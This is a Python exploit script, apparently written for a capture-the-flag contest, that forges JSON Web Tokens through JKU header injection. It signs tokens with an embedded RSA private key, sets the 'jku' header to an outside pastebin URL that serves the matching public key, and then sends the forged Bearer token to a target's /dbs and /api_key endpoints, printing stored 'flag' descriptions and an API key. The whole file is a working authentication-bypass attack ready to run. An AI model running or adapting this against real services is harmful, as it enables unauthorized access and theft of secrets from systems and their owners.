import requests
import jwt
import argparse
import json


parser = argparse.ArgumentParser()

jku = "https://pastebin.pl/view/raw/55b3f535"
private_key = """
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAggeQhWqYM1OrcFB+/fTbFiGPTFhfSFS11fKzv8yfg5yP8we+
1VpPfXFqXWrhimgdmYYcGBb6WrxNk5hz7OBhAkECxmA6iubV94N6MhKMcdNqQz1Q
TThggMyCauEtdu3V3Wc6Ezdv9cURT1qpwj/d58Raql6+MuELjy9K8yZWWiDtgsBH
0nv2LeVwMC7I5TJb6WgyOJGrFEr8dTT1dss4V6hV5d5wXXje/5z4KvycF6++n11q
PJz6fJQsCHmKNejyIjMdNyfinkCNtKdgoiROmvLJyU/LfCXxOBrTt3Ft+Qu1xNsv
8DbzRusJtmTRGk+/3kJb1XetZQwlz6jDYDbPIQIDAQABAoIBABRwl/lA/lfjKSno
nW3SVbYu5FW99oxqNINDOZpG0jRgIgi0CP2EysYPVAcHTBjzsON3P2dSBVzKCO/Q
oTh1NQqjqYoBinJXQv87fbPtUoJ6F1QmiT76Q8E7ZKzkZL8zN9Er7uciackah1QQ
DmtomrtaFF5/sipRUf3aE1ARkLVuCfeGa8bUjF3ENAtKa28TIaKZskaBgfuxi5a/
u7lpscr74+11gklFqgmJ865Lbjk6nJWgayOvSAtkGQaNjHL9tsgL04dBnLbQ8/sX
q0MI+YDhNiw1TsTMka2odgxIG9OHm0WHF/f/8PJ+GbN8YFmIuCmkWhVGTz6dGgjJ
o8CmO9kCgYEAywy1on3MOzbIfB5G1w1Tn+nxPKv0MWbRrYM/zLGANug6fIF3yPnB
Qk+QdQR+d70ry89ANZjk9pdwfFgnC8QMauXcBZoAQx88oH/MWbCKzdgmgVUy2Bqp
1/wiPIq4WCNep58tCG6o1JBP6cQUJ/YnIzIVbgqBpsI0VgMYCmm9LRMCgYEAo/Ak
gbcVIu2OhUDo67FwSQzzIqvIJ5g24OdwM9M5IjhFXxlR1hZWRMow3JpDlWcRi7sq
dMxpcpuhg5bpZ7gIUZ3I9qLw9GvW+pMLRrCvzfJ9yDHT0a6iWuGQoJlcfkLtvloa
j3/EqoGNDh1m+syP8aYmLTfXjCeUpvL9pkTNHXsCgYBGmYWyGPFhCVxOI6zX609P
Q+VYBiXi43A2V3Ngdbsx3C8xyUZf/88dglKlDUn30jOfKtGVkTLTNraq1W/GHIWA
yall3TUIIZ1P5P+lk8e/aM+CmqASGbtCWO2ChW0xYCLyP1tGGkvjlMXkbwPfHSxg
hXKED20jEVVnLq42OKvJNwKBgFjKsHsxVllcoVy7E2zU5iQqx2V39Si84Lxfnf3z
4XYPVEN1y0VRQ9huSpixVPmOoYo1DYHFVTel440KJ9DtdFQASeCL0EYSQpXlHq5i
9FVviYDsu/VNyNHAaj0R027vgSUgWFJwuWxATs3eTvB3617Oxs6m+DAJIBJsecWc
bhwRAoGADfrjknPtKXE0t9dh7df6dDyewRo/secYqblHQJ20zGMcENna3y31iagw
YTnzm0jN3XkYfMjZa9z35GYShZE7v8h1KJisYWuoFPwZIpAVa6UnIQYTMhQiqlWB
pRhR+1RKvwTKBfki9FCiY0/B+7ZywU9WIpUD3Sj30EhdOQsVUPs=
-----END RSA PRIVATE KEY-----
"""

def get_auth_token(login, key, jku):
    return jwt.encode(
        {"login": login}, 
        key,
        algorithm="RS256",
        headers={"jku": jku}
    )

def main():
    parser.add_argument('--host', type=str, required=True, help='Remote host (ip:port)')
    parser.add_argument('--login', type=str, required=True, help='User login')
    parser.add_argument('--jku', type=str, required=False, help='Url with Public RSA key')
    parser.add_argument('--key', type=str, required=False, help='File with Private RSA key')
    args = parser.parse_args()
    if args.jku and args.key:
        with open(args.key, "rb") as f:
            key = f.read()
        token = get_auth_token(args.login, key, args.jku)
    else:
        token = get_auth_token(args.login, private_key, jku)
    print("[*] Generate JWT payload: " + token[:32] +  "...")
    payload = {"Authorization": "Bearer " + token}
    r = requests.get("http://" + args.host + "/dbs", headers=payload)
    json_response = json.loads(r.text)
    for i in json_response["data"]:
        print("[*] Possible flag: ", i["description"])
    r = requests.get("http://" + args.host + "/api_key", headers=payload)
    json_response = json.loads(r.text)
    print("[*] Api Key: ", json_response["data"]["apikey"])


if __name__ == "__main__":
    main()